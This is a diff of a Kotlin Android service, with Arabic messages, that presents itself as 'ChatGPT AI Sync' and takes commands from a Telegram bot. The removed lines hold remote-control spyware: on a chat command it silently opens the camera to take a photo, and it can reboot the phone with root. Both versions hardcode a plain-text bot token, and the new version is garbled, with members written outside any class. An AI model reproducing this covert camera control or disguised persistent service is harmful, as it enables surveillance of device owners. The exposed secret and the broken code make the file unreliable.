@@ -1,202 +1,284 @@
-package com.cognitive.ai.syncagent
+companion object {
+    private const val TAG = "SyncAgent"
+    private const val CHANNEL_ID = "sync_channel"
+}
 
-import android.app.Notification
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.app.Service
-import android.content.Intent
-import android.os.Build
-import android.os.IBinder
-import android.util.Log
-import org.json.JSONObject
-import java.io.BufferedReader
-import java.io.InputStreamReader
-import java.net.HttpURLConnection
-import java.net.URL
-import kotlin.concurrent.thread
+// ضع رمز البوت الجديد هنا بعد إلغاء الرمز القديم
+private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
 
-class BackgroundControlService : Service() {
+private val authorizedChatId = "6904130639"
 
-    // ضع التوكن الصحيح هنا وتأكد أنه يتبع بوتك @mohammed2009salh_bot
-    private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
-    private var lastUpdateId = 0L
-    private var isRunning = true
+@Volatile
+private var isRunning = false
 
-    override fun onBind(intent: Intent?): IBinder? = null
+private var lastUpdateId = 0L
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForegroundServiceNotification()
-        startTelegramPolling()
-        return START_STICKY
+override fun onBind(intent: Intent?): IBinder? = null
+
+override fun onStartCommand(
+    intent: Intent?,
+    flags: Int,
+    startId: Int
+): Int {
+
+    startForeground(1001, createNotification())
+
+    if (!isRunning) {
+        isRunning = true
+        startPolling()
     }
 
-    private fun startForegroundServiceNotification() {
-        val channelId = "sync_channel_v81"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                channelId,
-                "المزامنة الخلفية نشطة",
-                NotificationManager.IMPORTANCE_LOW
-            )
-            val manager = getSystemService(NotificationManager::class.java)
-            manager?.createNotificationChannel(channel)
-        }
+    return START_STICKY
+}
 
-        val notification: Notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Notification.Builder(this, channelId)
-                .setContentTitle("ChatGPT AI Sync")
-                .setContentText("النظام يعمل بكفاءة في الخلفية")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details)
-                .build()
-        } else {
-            @Suppress("DEPRECATION")
-            Notification.Builder(this)
-                .setContentTitle("ChatGPT AI Sync")
-                .setContentText("النظام يعمل بكفاءة في الخلفية")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details)
-                .build()
-        }
+private fun createNotification(): Notification {
 
-        startForeground(1001, notification)
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+
+        val channel = NotificationChannel(
+            CHANNEL_ID,
+            "Telegram Sync",
+            NotificationManager.IMPORTANCE_LOW
+        )
+
+        getSystemService(NotificationManager::class.java)
+            .createNotificationChannel(channel)
+
+        return Notification.Builder(this, CHANNEL_ID)
+            .setContentTitle("ChatGPT AI Sync")
+            .setContentText("الخدمة تعمل")
+            .setSmallIcon(android.R.drawable.ic_menu_info_details)
+            .build()
     }
 
-    private fun startTelegramPolling() {
-        thread(start = true) {
-            while (isRunning) {
-                try {
-                    val urlString = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=5"
-                    val url = URL(urlString)
-                    val connection = url.openConnection() as HttpURLConnection
-                    connection.requestMethod = "GET"
-                    connection.connectTimeout = 6000
-                    connection.readTimeout = 6000
+    @Suppress("DEPRECATION")
+    return Notification.Builder(this)
+        .setContentTitle("ChatGPT AI Sync")
+        .setContentText("الخدمة تعمل")
+        .setSmallIcon(android.R.drawable.ic_menu_info_details)
+        .build()
+}
 
-                    if (connection.responseCode == 200) {
-                        val reader = BufferedReader(InputStreamReader(connection.inputStream))
-                        val response = StringBuilder()
-                        var line: String?
-                        while (reader.readLine().also { line = reader.readLine() } != null) {
-                            response.append(line)
-                        }
-                        reader.close()
+private fun startPolling() {
 
-                        val jsonResponse = JSONObject(response.toString())
-                        if (jsonResponse.getBoolean("ok")) {
-                            val results = jsonResponse.getJSONArray("result")
-                            for (i in 0 until results.length()) {
-                                val update = results.getJSONObject(i)
-                                lastUpdateId = update.getLong("update_id")
+    thread(name = "TelegramPolling") {
 
-                                var chatId = ""
-                                var text = ""
+        while (isRunning) {
 
-                                if (update.has("message")) {
-                                    val message = update.getJSONObject("message")
-                                    if (message.has("text")) {
-                                        chatId = message.getJSONObject("chat").getLong("id").toString()
-                                        text = message.getString("text")
-                                        handleCommand(chatId, text)
-                                    }
-                                } else if (update.has("callback_query")) {
-                                    val callbackQuery = update.getJSONObject("callback_query")
-                                    chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id").toString()
-                                    text = callbackQuery.getString("data")
-                                    handleCommand(chatId, text)
-                                }
+            var connection: HttpURLConnection? = null
+
+            try {
+
+                val url = URL(
+                    "https://api.telegram.org/bot$botToken/getUpdates" +
+                    "?offset=${lastUpdateId + 1}&timeout=20"
+                )
+
+                connection =
+                    url.openConnection() as HttpURLConnection
+
+                connection.connectTimeout = 10000
+                connection.readTimeout = 30000
+
+                val response = connection.inputStream
+                    .bufferedReader()
+                    .use { it.readText() }
+
+                val json = JSONObject(response)
+
+                if (json.optBoolean("ok")) {
+
+                    val results = json.getJSONArray("result")
+
+                    for (i in 0 until results.length()) {
+
+                        val update = results.getJSONObject(i)
+
+                        lastUpdateId =
+                            update.getLong("update_id")
+
+                        if (update.has("message")) {
+
+                            val message =
+                                update.getJSONObject("message")
+
+                            val chatId = message
+                                .getJSONObject("chat")
+                                .getLong("id")
+                                .toString()
+
+                            val text =
+                                message.optString("text", "")
+
+                            if (chatId == authorizedChatId) {
+                                handleCommand(chatId, text)
                             }
                         }
                     }
-                } catch (e: Exception) {
-                    Log.e("BotError", "Polling error: ${e.message}")
-                }
-                Thread.sleep(5000)
-            }
-        }
-    }
-
-    private fun handleCommand(chatId: String, text: String) {
-        when {
-            text == "/start" || text == "لوحة التحكم" -> {
-                val welcomeMsg = "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني.\nاختر الأمر المطلوب من الأزرار أدناه:"
-                sendTelegramMessageWithKeyboard(chatId, welcomeMsg)
-            }
-            text == "/photo" || text.contains("صورة") -> {
-                try {
-                    val intent = Intent(applicationContext, CameraCaptureActivity::class.java).apply {
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                        putExtra("chat_id", chatId)
-                    }
-                    applicationContext.startActivity(intent)
-                    sendTelegramMessage(chatId, "📸 جاري تشغيل الكاميرا والتقاط الصورة الطبيعية الآن...")
-                } catch (e: Exception) {
-                    sendTelegramMessage(chatId, "⚠️ فشل تشغيل واجهة الكاميرا: ${e.message}")
-                }
-            }
-            text == "/reboot" -> {
-                sendTelegramMessage(chatId, "🔌 جاري إعادة تشغيل النظام...")
-                try {
-                    val runtime = Runtime.getRuntime()
-                    runtime.exec(arrayOf("su", "-c", "reboot"))
-                } catch (e: Exception) {
-                    sendTelegramMessage(chatId, "⚠️ صلاحيات الجذع (Root) غير متوفرة لإعادة التشغيل المباشر.")
-                }
-            }
-            else -> {
-                sendTelegramMessage(chatId, "❓ أمر غير معروف. استخدم /start لعرض لوحة التحكم.")
-            }
-        }
-    }
-
-    private fun sendTelegramMessage(chatId: String, text: String) {
-        thread {
-            try {
-                val urlString = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=${java.net.URLEncoder.encode(text, "UTF-8")}"
-                val connection = URL(urlString).openConnection() as HttpURLConnection
-                connection.requestMethod = "GET"
-                connection.inputStream.close()
-            } catch (e: Exception) {}
-        }
-    }
-
-    private fun sendTelegramMessageWithKeyboard(chatId: String, text: String) {
-        thread {
-            try {
-                val jsonBody = JSONObject().apply {
-                    put("chat_id", chatId)
-                    put("text", text)
-                    put("reply_markup", JSONObject().apply {
-                        put("inline_keyboard", org.json.JSONArray().apply {
-                            put(org.json.JSONArray().apply {
-                                put(JSONObject().put("text", "📸 التقاط صورة").put("callback_data", "/photo"))
-                                put(JSONObject().put("text", "🔌 إعادة تشغيل").put("callback_data", "/reboot"))
-                            })
-                        })
-                    })
                 }
 
-                val urlString = "https://api.telegram.org/bot$botToken/sendMessage"
-                val url = URL(urlString)
-                val connection = url.openConnection() as HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.doOutput = true
-                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-
-                val os = connection.outputStream
-                os.write(jsonBody.toString().toByteArray(Charsets.UTF_8))
-                os.flush()
-                os.close()
-
-                val responseCode = connection.responseCode
-                Log.d("BotDebug", "Keyboard Response Code: $responseCode")
-                connection.inputStream.close()
             } catch (e: Exception) {
-                Log.e("BotDebug", "Keyboard Error: ${e.message}")
+
+                Log.e(TAG, "Polling error", e)
+                Thread.sleep(5000)
+
+            } finally {
+                connection?.disconnect()
             }
         }
     }
+}
 
-    override fun onDestroy() {
-        isRunning = false
-        super.onDestroy()
+private fun handleCommand(chatId: String, text: String) {
+
+    when (text.trim()) {
+
+        "/start" -> {
+
+            sendKeyboard(
+                chatId,
+                "🫡 أهلاً بك في لوحة التحكم.\nاختر أحد الخيارات:"
+            )
+        }
+
+        "/help" -> {
+
+            sendMessage(
+                chatId,
+                "الأوامر المتاحة:\n/start - عرض لوحة التحكم"
+            )
+        }
+
+        else -> {
+
+            sendMessage(
+                chatId,
+                "❓ أمر غير معروف. أرسل /start"
+            )
+        }
     }
+}
+
+private fun sendKeyboard(chatId: String, text: String) {
+
+    thread {
+
+        var connection: HttpURLConnection? = null
+
+        try {
+
+            val keyboard = JSONArray().apply {
+
+                put(
+                    JSONArray().apply {
+                        put(
+                            JSONObject().apply {
+                                put("text", "📋 حالة الخدمة")
+                                put("callback_data", "status")
+                            }
+                        )
+                    }
+                )
+
+                put(
+                    JSONArray().apply {
+                        put(
+                            JSONObject().apply {
+                                put("text", "ℹ️ معلومات")
+                                put("callback_data", "info")
+                            }
+                        )
+                    }
+                )
+            }
+
+            val body = JSONObject().apply {
+                put("chat_id", chatId)
+                put("text", text)
+                put(
+                    "reply_markup",
+                    JSONObject().put("inline_keyboard", keyboard)
+                )
+            }
+
+            connection = URL(
+                "https://api.telegram.org/bot$botToken/sendMessage"
+            ).openConnection() as HttpURLConnection
+
+            connection.requestMethod = "POST"
+            connection.doOutput = true
+
+            connection.setRequestProperty(
+                "Content-Type",
+                "application/json; charset=UTF-8"
+            )
+
+            connection.outputStream.use {
+                it.write(body.toString().toByteArray(Charsets.UTF_8))
+            }
+
+            val result = connection.inputStream
+                .bufferedReader()
+                .use { it.readText() }
+
+            Log.d(TAG, result)
+
+        } catch (e: Exception) {
+
+            Log.e(TAG, "Keyboard error", e)
+
+        } finally {
+            connection?.disconnect()
+        }
+    }
+}
+
+private fun sendMessage(chatId: String, text: String) {
+
+    thread {
+
+        var connection: HttpURLConnection? = null
+
+        try {
+
+            val body = JSONObject().apply {
+                put("chat_id", chatId)
+                put("text", text)
+            }
+
+            connection = URL(
+                "https://api.telegram.org/bot$botToken/sendMessage"
+            ).openConnection() as HttpURLConnection
+
+            connection.requestMethod = "POST"
+            connection.doOutput = true
+
+            connection.setRequestProperty(
+                "Content-Type",
+                "application/json; charset=UTF-8"
+            )
+
+            connection.outputStream.use {
+                it.write(body.toString().toByteArray(Charsets.UTF_8))
+            }
+
+            val result = connection.inputStream
+                .bufferedReader()
+                .use { it.readText() }
+
+            Log.d(TAG, result)
+
+        } catch (e: Exception) {
+
+            Log.e(TAG, "Message error", e)
+
+        } finally {
+            connection?.disconnect()
+        }
+    }
+}
+
+override fun onDestroy() {
+    isRunning = false
+    super.onDestroy()
 }
